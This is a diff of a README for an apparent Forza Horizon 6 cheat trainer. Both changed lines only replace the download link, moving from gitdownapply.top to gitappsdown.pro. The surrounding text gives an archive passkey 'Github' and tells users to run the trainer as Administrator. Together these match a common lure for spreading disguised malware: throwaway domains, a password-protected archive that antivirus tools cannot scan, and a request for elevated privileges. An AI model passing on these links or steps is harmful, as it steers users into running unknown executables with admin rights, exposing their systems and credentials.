@@ -6,7 +6,7 @@ Forza Horizon 6 trainer with credits editor, wheelspins, unlock all cars, telepo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -88,7 +88,7 @@ Based on community tools like FH6 All-in-One Trainer and FH6 Menu.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Set Forza Horizon 6 to offline mode.
 3. Launch Forza Horizon 6 and load fully into the world.
 4. Run the trainer **as Administrator**.
